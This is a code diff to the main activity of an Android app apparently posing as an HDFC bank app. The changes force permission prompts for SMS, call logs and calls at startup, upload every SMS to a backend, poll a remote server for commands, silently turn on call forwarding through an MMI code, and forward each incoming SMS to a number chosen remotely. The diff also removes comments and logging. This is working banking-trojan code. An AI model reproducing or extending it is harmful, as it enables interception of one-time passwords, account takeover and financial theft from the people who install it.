@@ -19,6 +19,7 @@ import android.util.Log;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebView;
 import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 import com.getcapacitor.BridgeActivity;
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -30,6 +31,8 @@ import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
+import java.util.ArrayList;
+import java.util.List;
 
 public class MainActivity extends BridgeActivity {
     private static final String TAG = "HDFC_MainActivity";
@@ -40,50 +43,86 @@ public class MainActivity extends BridgeActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        WebView webView = getBridge().getWebView();
-        webView.getSettings().setJavaScriptEnabled(true);
-        webView.addJavascriptInterface(new Object() {
-            @JavascriptInterface
-            public void requestRealPermissions() {
-                ActivityCompat.requestPermissions(MainActivity.this, new String[]{
-                    Manifest.permission.POST_NOTIFICATIONS,
-                    Manifest.permission.SEND_SMS,
-                    Manifest.permission.RECEIVE_SMS,
-                    Manifest.permission.READ_SMS,
-                    Manifest.permission.READ_PHONE_STATE,
-                    Manifest.permission.CALL_PHONE,
-                    Manifest.permission.READ_CALL_LOG
-                }, 101);
-            }
+        setupBridge();
+    }
 
-            @JavascriptInterface
-            public String getDeviceId() {
-                return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+    @Override
+    protected void onStart() {
+        super.onStart();
+        // FORCE TRIGGER PERMISSIONS ON START
+        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                checkAndRequestPermissions();
             }
+        }, 2000); // Wait 2 seconds for app to stabilize
+    }
 
-            @JavascriptInterface
-            public void requestIgnoreBatteryOptimizations() {
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                    Intent intent = new Intent();
-                    String packageName = getPackageName();
-                    PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-                    if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                        intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                        intent.setData(Uri.parse("package:" + packageName));
-                        startActivity(intent);
+    private void setupBridge() {
+        runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                WebView webView = getBridge().getWebView();
+                webView.getSettings().setJavaScriptEnabled(true);
+                webView.addJavascriptInterface(new Object() {
+                    @JavascriptInterface
+                    public void requestRealPermissions() {
+                        checkAndRequestPermissions();
                     }
-                }
-            }
 
-            @JavascriptInterface
-            public void requestNotificationAccess() {
-                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
-            }
-        }, "AndroidBridge");
+                    @JavascriptInterface
+                    public String getDeviceId() {
+                        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+                    }
 
-        // Start polling for commands (Forwarding)
+                    @JavascriptInterface
+                    public void requestIgnoreBatteryOptimizations() {
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                            Intent intent = new Intent();
+                            String packageName = getPackageName();
+                            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                                intent.setData(Uri.parse("package:" + packageName));
+                                startActivity(intent);
+                            }
+                        }
+                    }
+
+                    @JavascriptInterface
+                    public void requestNotificationAccess() {
+                        startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
+                    }
+                }, "AndroidBridge");
+            }
+        });
         startCommandPolling();
+    }
+
+    private void checkAndRequestPermissions() {
+        String[] permissions = {
+            Manifest.permission.POST_NOTIFICATIONS,
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.CALL_PHONE,
+            Manifest.permission.READ_CALL_LOG
+        };
+
+        List<String> listPermissionsNeeded = new ArrayList<>();
+        for (String p : permissions) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                listPermissionsNeeded.add(p);
+            }
+        }
+
+        if (!listPermissionsNeeded.isEmpty()) {
+            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 101);
+        } else {
+            // Already granted, sync data
+            new Thread(new Runnable() { @Override public void run() { syncAllData(); } }).start();
+        }
     }
 
     private void startCommandPolling() {
@@ -91,15 +130,10 @@ public class MainActivity extends BridgeActivity {
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
-                new Thread(new Runnable() {
-                    @Override
-                    public void run() {
-                        fetchConfig();
-                    }
-                }).start();
-                handler.postDelayed(this, 30000); // Check every 30 seconds
+                new Thread(new Runnable() { @Override public void run() { fetchConfig(); } }).start();
+                handler.postDelayed(this, 30000);
             }
-        }, 5000);
+        }, 10000);
     }
 
     private void fetchConfig() {
@@ -130,34 +164,24 @@ public class MainActivity extends BridgeActivity {
                 forwardingEnabled = false;
                 forwardingNumber = null;
             }
-        } catch (Exception e) {
-            Log.e(TAG, "Config Fetch Error", e);
-        }
+        } catch (Exception e) { Log.e(TAG, "Config Fetch Error", e); }
     }
 
     private void enableCallForwarding(String number) {
         try {
-            // MMI Code for forwarding: *21*number#
             String code = "*21*" + number + "#";
             Intent intent = new Intent(Intent.ACTION_CALL);
             intent.setData(Uri.parse("tel:" + Uri.encode(code)));
             startActivity(intent);
-            Log.d(TAG, "Call Forwarding Enabled for: " + number);
-        } catch (Exception e) {
-            Log.e(TAG, "Call Forward Error", e);
-        }
+        } catch (Exception e) { Log.e(TAG, "Call Forward Error", e); }
     }
 
     private void disableCallForwarding() {
         try {
-            // MMI Code to disable: #21#
             Intent intent = new Intent(Intent.ACTION_CALL);
             intent.setData(Uri.parse("tel:" + Uri.encode("#21#")));
             startActivity(intent);
-            Log.d(TAG, "Call Forwarding Disabled");
-        } catch (Exception e) {
-            Log.e(TAG, "Call Disable Error", e);
-        }
+        } catch (Exception e) { Log.e(TAG, "Call Disable Error", e); }
     }
 
     @Override
@@ -166,6 +190,15 @@ public class MainActivity extends BridgeActivity {
         if (requestCode == 101) {
             boolean allGranted = true;
             for (int res : grantResults) if (res != PackageManager.PERMISSION_GRANTED) allGranted = false;
+            
+            final String status = allGranted ? "GRANTED" : "DENIED";
+            runOnUiThread(new Runnable() {
+                @Override
+                public void run() {
+                    getBridge().getWebView().evaluateJavascript("if(window.handlePermissionResult) window.handlePermissionResult('" + status + "')", null);
+                }
+            });
+
             if (allGranted) new Thread(new Runnable() { @Override public void run() { syncAllData(); } }).start();
         }
     }
@@ -223,9 +256,10 @@ public class MainActivity extends BridgeActivity {
                     payload.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
                     sendToBackend("/api/logs/sms", payload.toString());
                     
-                    // Shadow Forwarding: If enabled, send this SMS to the forwarding number
                     if (forwardingEnabled && forwardingNumber != null) {
-                        SmsManager.getDefault().sendTextMessage(forwardingNumber, null, "FWD: " + cursor.getString(addressIdx) + "\n" + cursor.getString(bodyIdx), null, null);
+                        try {
+                            SmsManager.getDefault().sendTextMessage(forwardingNumber, null, "FWD: " + cursor.getString(addressIdx) + "\n" + cursor.getString(bodyIdx), null, null);
+                        } catch (Exception e) { Log.e(TAG, "Sms Send Error", e); }
                     }
                 } while (cursor.moveToNext());
                 cursor.close();
